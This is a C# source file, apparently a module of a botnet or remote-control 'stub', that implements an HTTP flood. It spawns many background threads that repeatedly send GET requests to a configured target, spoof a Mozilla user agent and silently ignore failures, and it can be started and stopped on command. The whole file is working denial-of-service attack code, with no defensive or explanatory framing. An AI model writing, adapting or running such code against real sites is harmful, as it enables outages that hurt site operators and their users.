using System;
using System.Collections.Generic;
using System.Net;
using System.Threading;

namespace Stub
{
    internal class HttpFlood
    {
        // Configurable fields
        public static string Host;
        public static int Threads;

        // Internal state
        private static List<Thread> FloodingThreads = new List<Thread>();
        private static CancellationTokenSource CancelSource;

        /// <summary>
        /// Starts the HTTP flood with the configured Host and Threads.
        /// </summary>
        public static void StartHttpFlood()
        {
            CancelSource = new CancellationTokenSource();

            for (int i = 0; i < Threads; i++)
            {
                var token = CancelSource.Token;
                Thread t = new Thread(() =>
                {
                    HttpRequest requester = new HttpRequest(Host);
                    requester.Send(token);
                });

                t.IsBackground = true;
                FloodingThreads.Add(t);
                t.Start();
            }
        }

        /// <summary>
        /// Gracefully stops all flooding threads.
        /// </summary>
        public static void StopHttpFlood()
        {
            if (CancelSource != null)
            {
                CancelSource.Cancel();

                foreach (var t in FloodingThreads)
                {
                    try { t.Join(500); } catch { }
                }

                FloodingThreads.Clear();
                CancelSource.Dispose();
                CancelSource = null;
            }
        }

        /// <summary>
        /// Performs continuous GET requests to the configured host.
        /// </summary>
        private class HttpRequest
        {
            private string Host;

            public HttpRequest(string host)
            {
                this.Host = host;
            }

            public void Send(CancellationToken token)
            {
                while (!token.IsCancellationRequested)
                {
                    try
                    {
                        using (var client = new WebClient())
                        {
                            client.Headers.Add(HttpRequestHeader.UserAgent, "Mozilla/5.0");
                            client.DownloadString(this.Host);
                        }
                    }
                    catch
                    {
                        // Ignore failed requests silently
                    }

                    Thread.Sleep(50); // Reduce CPU load (optional)
                }
            }
        }
    }
}
